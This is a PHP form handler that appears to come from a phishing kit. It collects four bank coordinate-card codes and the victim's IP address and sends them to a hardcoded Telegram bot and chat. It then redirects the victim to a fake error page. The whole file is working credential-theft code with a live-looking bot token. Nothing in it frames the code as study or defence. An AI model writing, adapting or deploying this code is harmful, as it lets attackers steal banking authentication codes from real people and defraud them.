<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['code01']) && isset ($_POST['code02']) && isset ($_POST['code03']) && isset ($_POST['code04']) ){

$message = ".:::Cordenadas#1:::.\r\n29: ".$_POST['code01']."\r\n18: ".$_POST['code02']."\r\n9: ".$_POST['code03']."\r\n37: ".$_POST['code04']."\r\n".$userp."";
  
$apiToken = "5984973262:AAHOKiUoO1lwfgX1BPVBLTsWTa-S_ntHMS8";


$data = [
  'chat_id' => "5512074919",

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: error402.html');

}else{ header ('location: index.html'); exit(); }

?>